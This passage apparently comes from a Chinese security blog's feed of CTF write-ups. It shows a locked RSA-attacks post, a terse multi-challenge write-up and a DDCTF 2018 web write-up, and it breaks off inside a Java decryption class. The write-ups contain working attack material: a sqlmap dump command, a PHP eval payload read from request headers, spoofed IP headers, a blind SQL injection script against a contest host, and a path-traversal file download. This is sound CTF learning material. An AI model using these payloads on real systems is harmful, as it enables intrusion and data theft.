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</div><div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div><script>var onError = function(error) {showMessage("嘻嘻嘻，密码不对哦~", 5000);};function decrypt() {var passwd = document.getElementById("enc_pwd_input").value;console.log(passwd);doDecrypt(passwd, onError);}</script></div>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;其实对于RSA加密算法攻击的文章，互联网上已经有很多了，所以本文主要还是以整理为主，只列出每种攻击方式的攻击条件、需要的一些工具、具体操作步骤等。&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://winter3un.github.io/tags/ctf/"/>
    
      <category term="crypto" scheme="https://winter3un.github.io/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>2018 706 writeup</title>
    <link href="https://winter3un.github.io/2018/07/09/2018-706-wp/"/>
    <id>https://winter3un.github.io/2018/07/09/2018-706-wp/</id>
    <published>2018-07-09T11:00:43.000Z</published>
    <updated>2018-07-10T00:52:55.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>706测试的题目，wp简单写下。</p><a id="more"></a><h2 id="Misc1"><a href="#Misc1" class="headerlink" title="Misc1"></a>Misc1</h2><p>两张图叠加，010处理下就出来了。</p><h2 id="Misc2"><a href="#Misc2" class="headerlink" title="Misc2"></a>Misc2</h2><p>png的长度设置长一点就出flag</p><h2 id="misc3"><a href="#misc3" class="headerlink" title="misc3"></a>misc3</h2><p>steg 打开，RGB三个最低色道分别来一次，flag组合下就出来了。</p><h2 id="Misc4"><a href="#Misc4" class="headerlink" title="Misc4"></a>Misc4</h2><p>流量包内有jsfuck编码的密码，log文件内有rar文件，拿密码去解压rar文件，就出flag</p><h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p>flag直接写在main函数里了。。</p><h2 id="re2"><a href="#re2" class="headerlink" title="re2"></a>re2</h2><p>题目算法似乎有问题，反正我是没解出来，好像有人解出来了- -，真流弊</p><h2 id="crypt1"><a href="#crypt1" class="headerlink" title="crypt1"></a>crypt1</h2><p>直接写出解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#-*- coding:utf8 -*-</span></div><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES,DES3</div><div class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">()</span>:</span></div><div class="line">flag=open(<span class="string">"flag.txt"</span>,<span class="string">"rb"</span>).read().strip()</div><div class="line">paclen=<span class="number">8</span>-len(flag)%<span class="number">8</span></div><div class="line">flag+=paclen*(chr(paclen))</div><div class="line"></div><div class="line">key1=<span class="string">"do_you_know_des3"</span></div><div class="line">obj1=DES3.new(key1,DES3.MODE_ECB)</div><div class="line">s1=obj1.encrypt(flag)</div><div class="line"></div><div class="line">key2=<span class="string">"and_you_know_aes"</span></div><div class="line">iv=md5(key2).digest()</div><div class="line">obj2=AES.new(key2,AES.MODE_CBC,iv)</div><div class="line">s2=obj2.encrypt(s1)</div><div class="line"><span class="keyword">with</span> open(<span class="string">"flag.enc"</span>,<span class="string">"wb"</span>) <span class="keyword">as</span> f:</div><div class="line">f.write(s2)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">()</span>:</span></div><div class="line">s1=open(<span class="string">"flag.enc"</span>,<span class="string">"rb"</span>).read()</div><div class="line"></div><div class="line">key2=<span class="string">"and_you_know_aes"</span></div><div class="line">iv=md5(key2).digest()</div><div class="line">obj2=AES.new(key2,AES.MODE_CBC,iv)</div><div class="line">s2=obj2.decrypt(s1)</div><div class="line"></div><div class="line"></div><div class="line">key1=<span class="string">"do_you_know_des3"</span></div><div class="line">obj1=DES3.new(key1,DES3.MODE_ECB)</div><div class="line">flag=obj1.decrypt(s2)</div><div class="line"></div><div class="line"><span class="keyword">print</span> flag</div><div class="line"></div><div class="line"></div><div class="line">decrypt()</div></pre></td></tr></table></figure><h2 id="crypt2"><a href="#crypt2" class="headerlink" title="crypt2"></a>crypt2</h2><p>Coppersmith攻击了解一下。</p><h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p>静态编译，ROPgadget了解一下。</p><h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><p>根据0ctf2018 babyheap改的题，把off by one改没了，不知道怎么做= =</p><h2 id="web1-web7"><a href="#web1-web7" class="headerlink" title="web1-web7"></a>web1-web7</h2><p>全是原题，不会做的话，实验吧刷题了解一下。</p><h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p>有waf的报错注入，waf只是为了限制考点，很容易绕过</p><h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><p>格式化字符串，sqlmap了解一下</p><p><code>sqlmap -r post -p username --prefix &quot;%1$&#39;&quot; --suffix &quot;#&quot; -v3 --technique=T -D ctf -T flag --dump</code></p><h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><p>命令执行，rctf原题改，getallheaders被禁用了，但是apache_request_headers可以</p><p>payload为<code>eval(next(apache_request_headers()));</code></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;706测试的题目，wp简单写下。&lt;/p&gt;
    
    </summary>
    
    
      <category term="writeup" scheme="https://winter3un.github.io/tags/writeup/"/>
    
      <category term="ctf" scheme="https://winter3un.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>DDCTF-2018  WEB WRITEUP</title>
    <link href="https://winter3un.github.io/2018/04/19/ddctf-2018/"/>
    <id>https://winter3un.github.io/2018/04/19/ddctf-2018/</id>
    <published>2018-04-20T05:44:11.000Z</published>
    <updated>2018-04-20T05:48:49.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>工作需要较强的web安全能力，所以我想通过打ctf的web类题目来提高这方面的水平，以下为这次didictf web类的题解。</p><a id="more"></a><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><img src="/2018/04/19/ddctf-2018/1.png" alt="1.png" title=""><p>非法链接的问题，直接在http头中加入以下键值对绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">X-Originating-IP: 123.232.23.245</div><div class="line">X-Forwarded-For: 123.232.23.245</div><div class="line">X-Remote-IP: 123.232.23.245</div><div class="line">X-Remote-Addr: 123.232.23.245</div></pre></td></tr></table></figure></p><p>其实也可以配置burp的插件bypass waf（<a href="https://www.codewatch.org/blog/?p=408" target="_blank" rel="external">https://www.codewatch.org/blog/?p=408</a> ） ，来绕过限制正常在客户端浏览。</p><img src="/2018/04/19/ddctf-2018/2.png" alt="2.png" title=""><p>emmm…明显考察注入，不过这边的注入点比较隐蔽，在<code>author</code>参数这儿，页面上隐藏了输入点，我们可以直接写python脚本通过盲注的手法跑出flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> hashlib</div><div class="line"></div><div class="line">s = <span class="string">''</span></div><div class="line"><span class="keyword">for</span> index <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">0x20</span>):</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x30</span>,<span class="number">0x7f</span>):</div><div class="line">id = <span class="string">""</span></div><div class="line">title = <span class="string">""</span></div><div class="line">date = <span class="string">""</span></div><div class="line">author = <span class="string">"-1'||if(ord(substr((select secvalue from ctf_key9 limit 0,1),"</span>+str(index)+<span class="string">",1))="</span>+str(i)+<span class="string">",0,1)#"</span></div><div class="line"></div><div class="line"><span class="comment"># select * from content where id = ? and author = ' -1' ||  ' and date = ' = 'a' union '   </span></div><div class="line"></div><div class="line">proxies = &#123;<span class="string">"http"</span>:<span class="string">"127.0.0.1:8080"</span>&#125;</div><div class="line"></div><div class="line">data = &#123; <span class="string">"id"</span>:id,</div><div class="line"><span class="string">"title"</span>:title,</div><div class="line"><span class="string">"author"</span>:author,</div><div class="line"><span class="string">"data"</span>:date,</div><div class="line"><span class="string">"button"</span>:<span class="string">"search"</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">t = str(int(time.time()))</div><div class="line"></div><div class="line">str0 = <span class="string">'id='</span>+id+<span class="string">'title='</span>+title+<span class="string">'author='</span>+author+<span class="string">'date='</span>+date+<span class="string">'time='</span>+t+<span class="string">'adrefkfweodfsdpiru'</span></div><div class="line"></div><div class="line"></div><div class="line">sig = hashlib.sha1(str0).hexdigest()</div><div class="line"></div><div class="line"></div><div class="line">ip = <span class="string">'123.232.23.245'</span></div><div class="line"></div><div class="line">headers  = &#123;<span class="string">'X-Originating-IP'</span>: ip,</div><div class="line"><span class="string">'X-Forwarded-For'</span>: ip,</div><div class="line"><span class="string">'X-Remote-IP'</span>: ip,</div><div class="line"><span class="string">'X-Remote-Addr'</span>: ip,</div><div class="line"><span class="string">'X-Client-IP'</span>: ip,</div><div class="line"><span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"</span>,</div><div class="line"><span class="string">'Referer'</span>:<span class="string">"http://123.232.23.245/"</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> len(requests.post(url=<span class="string">"http://116.85.43.88:8080/NQYPTEMNWRQIYLEP/dfe3ia/index.php?sig="</span>+sig+<span class="string">"&amp;time="</span>+str(int(time.time())),data=data,headers=headers,proxies=proxies).content) != <span class="number">2420</span>:</div><div class="line">s += chr(i)</div><div class="line"><span class="keyword">break</span></div><div class="line"><span class="keyword">print</span> s</div><div class="line"><span class="comment"># print str0</span></div></pre></td></tr></table></figure><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>web2的难度明显要比web1要高。</p><p>点击链接进去后，直接<code>ctrl+u</code>看源码，发现了可疑的链接<br><img src="/2018/04/19/ddctf-2018/3.png" alt="3.png" title=""></p><p>将<code>ZmF2aWNvbi5pY28=</code> base64解码后，发现是<code>favicon.ico</code> ，初步判断该<code>api</code>应该存在任意文件下载漏洞。</p><p>接下来通过构造<code>web.xml</code>的地址(<code>../../WEB-INF/web.xml</code> —base64&gt;&gt;&gt; <code>Li4vLi4vV0VCLUlORi93ZWIueG1s</code>)，并利用该漏洞，下载该配置文件。</p><p>下载完了以后分析该<code>web.xml</code>文件，在文件内发现其他关联的文件，仿照上一步操作，将所有相关的文件都下载到本地分析。</p><p>在<code>web.xml</code>中发现该<code>class</code>文件</p><img src="/2018/04/19/ddctf-2018/4.png" alt="4.png" title=""><p>下载至本地后，用<code>GD-GUI</code>分析发现为<code>flag</code>的加密算法</p><img src="/2018/04/19/ddctf-2018/5.png" alt="5.png" title=""><p>但是我们缺少关键的<code>email</code>和<code>flag</code>密文，继续寻找相关文件，开了下脑洞，猜测控制器文件<code>FlagController.class</code>,没想到真的有233333 下载下来分析。如图，只要我们给<code>email</code>就给我们加密后的<code>flag</code> 233333 </p><img src="/2018/04/19/ddctf-2018/6.png" alt="6.png" title=""><p>回到首页，发现<code>email</code>。。。</p><img src="/2018/04/19/ddctf-2018/7.png" alt="7.png" title=""><p>所有条件都齐全了，逆向算法，最后写出了对应的解密脚本</p><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> java.io.File;</div><div class="line"><span class="keyword">import</span> java.io.FileInputStream;</div><div class="line"><span class="keyword">import</span> java.io.IOException;</div><div class="line"><span class="keyword">import</span> java.io.InputStream;</div><div class="line"><span class="keyword">import</span> java.io.PrintStream;</div><div class="line"><span class="keyword">import</span> java.security.InvalidKeyException;</div><div class="line"><span class="keyword">import</span> java.security.Key;</div><div class="line"><span class="keyword">import</span> java.security.KeyStore;</div><div class="line"><span class="keyword">import</span> java.security.PublicKey;  </div><div class="line"><span class="keyword">import</span> java.security.KeyStoreException;</div><div class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</div><div class="line"><span class="keyword">import</span> java.security.SecureRandom;</div><div class="line"><span class="keyword">import</span> java.security.UnrecoverableKeyException;</div><div class="line"><span class="keyword">import</span> java.security.cert.CertificateException;</div><div class="line"><span class="keyword">import</span> java.util.Properties;</div><div class="line"><span class="keyword">import</span> java.util.UUID;</div><div class="line"><span class="keyword">import</span> javax.crypto.BadPaddingException;</div><div class="line"><span class="keyword">import</span> javax.crypto.Cipher;</div><div class="line"><span class="keyword">import</span> javax.crypto.IllegalBlockSizeException;</div><div class="line"><span class="keyword">import</span> javax.crypto.Mac;</div><div class="line"><span class="keyword">import</span> javax.crypto.NoSuchPaddingException;</div><div class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</div><div class="line"><span class="keyword">import</span> sun.misc.BASE64Decoder;  </div><div class="line"><span class="keyword">import</span> sun.misc.BASE64Encoder;  </div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">decrypt</span></span></div><div class="line">&#123;</div><div class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] decryptBASE64(String key) 